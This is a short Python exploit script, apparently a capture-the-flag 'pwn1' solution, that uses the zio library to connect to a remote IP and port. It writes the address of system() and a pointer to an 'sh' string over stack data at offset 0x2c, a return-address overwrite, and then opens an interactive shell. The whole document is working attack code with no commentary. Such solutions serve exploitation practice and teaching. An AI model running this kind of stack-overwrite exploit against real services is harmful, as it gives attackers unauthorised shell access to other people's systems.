from zio import *
target = './pwn1'
target = ('106.75.37.29', 10000)

def write_byte(io, index, value):
    io.read_until(':')
    io.writeline(str(index))
    io.read_until(':')
    io.writeline(str(value))

def write_dword(io, index, value):
    d = l32(value)
    for i in range(4):
        write_byte(io, index+i, ord(d[i]))

def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))
    sh= 0x804828e
    system = 0x080483E0
    write_dword(io, 0x2c, system)
    write_dword(io, 0x2c+8, sh)

    write_byte(io, 1, 1)
    write_byte(io, 1, 1)
    io.interact()


exp(target)
